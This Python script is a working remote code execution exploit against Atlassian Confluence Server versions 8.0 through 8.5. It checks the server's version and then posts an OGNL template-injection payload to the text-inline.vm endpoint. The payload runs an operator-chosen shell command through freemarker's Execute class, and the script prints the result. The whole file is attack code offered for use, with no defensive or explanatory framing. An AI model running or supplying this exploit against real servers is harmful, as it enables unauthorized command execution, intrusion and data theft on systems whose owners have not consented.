import requests
import urllib3
import argparse
import re

from urllib3 import request, response
urllib3.disable_warnings()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True,help="Atlassian Confluence Server URL")
parser.add_argument("-c", "--command",required=False, help="Command to Execute")
args = parser.parse_args()

session = requests.Session()

def bold_text(text):
    bold_start = '\033[1m'
    bold_end = '\033[0m'
    return bold_start + text + bold_end

def check_vulnerable_confluence_server(url):
    vulnerable_versions =[r'8\.0\.[0-4]',
                          r'8\.1\.[0-4]',
                          r'8\.2\.[0-3]',
                          r'8\.3\.[0-4]',
                          r'8\.4\.[0-5]',
                          r'8\.5\.[0-4]',]
    response = requests.get(url, verify=False, timeout=10)
    repattern = r'<meta name="ajs-version-number" content="(.+?)">'
    version = re.findall(repattern, response.text)[0]
    matches = [pattern for pattern in vulnerable_versions if re.match(pattern, version)]

    if matches:
        print("[+] Vulnerable server, Version: ", bold_text(version))
    else:
        print("[-] Not vulnerable, Version: ", bold_text(version))
        exit()

try:
    endpoint = "/template/aui/text-inline.vm"
    url = args.url+endpoint
    malicious_data = 'label=\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().getWriter().write((new freemarker.template.utility.Execute()).exec({"'+args.command+'"}))\r\n'

    print("[+] Checking vulnerable version Atlassian Confluence Server")
    check_vulnerable_confluence_server(url)
    
    headers = { 'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': str(len(malicious_data))}

    print("[+] Sending malicious request...")
    response = session.post(url, verify=False, timeout=10, data=malicious_data, headers=headers)
    
    print("[+] Exploited... ;)")
    print("===============================================")
    print(response.text.split('<!DOCTYPE html>')[0].strip())
except Exception as e:
    print("[-] Something went wrong:",e)
    